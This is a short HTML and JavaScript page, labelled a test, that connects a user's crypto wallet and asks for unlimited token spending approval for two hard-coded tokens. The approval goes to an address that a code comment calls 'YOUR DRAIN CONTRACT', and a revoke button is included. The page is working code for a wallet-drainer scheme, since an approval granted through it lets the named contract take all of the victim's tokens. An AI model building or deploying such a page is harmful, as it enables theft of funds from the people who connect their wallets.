<!DOCTYPE html>
<html>
<head>
  <title>Test Approval UI</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
  <style>
    body { font-family: sans-serif; }
    button { padding: 8px 12px; margin: 5px; cursor: pointer; }
  </style>
</head>

<body>

<h2>🧪 Test: Unlimited Approval (Manual)</h2>

<button onclick="connect()">Connect Wallet</button>

<p><b>Wallet:</b> <span id="addr">-</span></p>

<hr>

<h3>Token A</h3>
<button onclick="approveMax(tokenA)">Approve Unlimited</button>
<button onclick="revoke(tokenA)">Revoke</button>

<h3>Token B</h3>
<button onclick="approveMax(tokenB)">Approve Unlimited</button>
<button onclick="revoke(tokenB)">Revoke</button>

<script>
let provider, signer, user;

// ✅ YOUR TOKENS
const tokenA = "0x089d6677646bc535B1A8535ED856bb17493E332d";
const tokenB = "0x48e8484f7D30305A6Cb442fd4c780E0BaD366b76";

// ✅ YOUR DRAIN CONTRACT
const spender = "0x8dc3da2ff65ec0bbac40f33efe7c02c9c0b7ebaf";

const ABI = [
  "function approve(address spender, uint256 amount) returns (bool)"
];

async function connect() {
  if (!window.ethereum) {
    alert("Open inside wallet browser");
    return;
  }

  await window.ethereum.request({ method: "eth_requestAccounts" });

  provider = new ethers.providers.Web3Provider(window.ethereum, "any");
  signer = provider.getSigner();
  user = await signer.getAddress();

  document.getElementById("addr").innerText = user;
}

// 🔥 Unlimited approval (explicit click)
async function approveMax(tokenAddr) {
  try {
    const token = new ethers.Contract(tokenAddr, ABI, signer);

    const tx = await token.approve(
      spender,
      ethers.constants.MaxUint256
    );

    await tx.wait();

    alert("✅ Unlimited approval granted");

  } catch (e) {
    alert(e.message);
  }
}

// 🔐 Revoke
async function revoke(tokenAddr) {
  try {
    const token = new ethers.Contract(tokenAddr, ABI, signer);

    const tx = await token.approve(spender, 0);
    await tx.wait();

    alert("🔐 Approval revoked");

  } catch (e) {
    alert(e.message);
  }
}
</script>

</body>
</html>
